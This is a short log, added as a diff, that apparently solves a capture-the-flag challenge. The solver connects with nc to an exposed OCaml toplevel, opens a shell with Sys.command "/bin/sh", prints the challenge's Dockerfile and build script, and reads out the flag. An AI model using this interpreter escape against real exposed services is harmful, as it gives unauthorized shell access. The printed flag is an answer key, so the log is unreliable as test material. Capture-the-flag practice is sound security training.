@@ -1,0 +1,35 @@
+$ nc 20.169.252.240 4201
+        OCaml version 4.08.1
+
+# Sys.command "/bin/sh";;
+ls
+Dockerfile
+build.sh
+flag.txt
+secret
+cat *
+FROM ubuntu:20.04
+
+RUN apt-get update -y && \
+    apt-get install -y python3-pip python3-dev ncat curl opam
+
+RUN opam init --yes --disable-sandboxing
+
+WORKDIR /app
+
+COPY . /app
+
+RUN chmod -R 555 /app
+
+USER 1000:1000
+
+CMD ncat -klvp 4201 -m 999999 -e /bin/ocamldocker stop ocamljail
+docker rm ocamljail
+docker build -t "ocaml" . 
+docker run --name ocamljail -d -p 4201:4201 ocaml 
+The real flag is not here...
+cat /app/*/*
+{
+    "message": "Flag is here. OCaml syntax is easy, right?",
+    "flag": "cvctf{J41L3d_OOOO-C4mL@@}"
+}
